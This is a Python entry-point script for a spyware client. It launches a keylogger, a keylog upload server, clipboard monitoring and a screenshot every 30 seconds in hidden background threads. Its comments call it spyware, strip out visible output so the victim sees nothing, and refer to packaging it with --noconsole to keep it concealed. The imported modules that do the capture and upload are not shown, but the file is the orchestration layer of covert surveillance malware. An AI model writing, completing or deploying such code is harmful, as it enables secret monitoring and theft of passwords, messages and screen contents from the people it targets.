import threading
import keylogger
import upload_server
import clipboard
import screenshot

if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=keylogger.start_keylogger, daemon=True)
    keylogger_thread.start()

    # Start the server upload (for keylogs) in a separate thread
    server_upload_thread = threading.Thread(target=upload_server.start_upload_server, daemon=True)
    server_upload_thread.start()

    # Start clipboard monitoring in a separate thread
    clipboard_thread = threading.Thread(target=clipboard.monitor_clipboard, daemon=True)
    clipboard_thread.start()

    # Start periodic screenshot capture in a separate thread
    # You can adjust the interval (e.g., 30 seconds) as needed
    screenshot_thread = threading.Thread(target=screenshot.periodic_screenshot_capture, args=(30,), daemon=True)
    screenshot_thread.start()

    # print("Spyware components initialized and running in background threads.") # Commented out
    # In a real scenario, you wouldn't print this.
    # The script will continue running as long as the daemon threads are active
    # or if it's packaged and run in a way that doesn't auto-exit.
    # A simple way to keep the main thread alive for testing:
    try:
        while True:
            threading.Event().wait(timeout=60) # Keep main thread alive, checking every 60s
    except KeyboardInterrupt:
        pass # print("Shutting down spyware client.") # Commented out

    # Original join calls (might prevent --noconsole from detaching properly if not daemon)
    # keylogger_thread.join()
    # server_upload_thread.join()
    # clipboard_thread.join()
    # screenshot_thread.join()
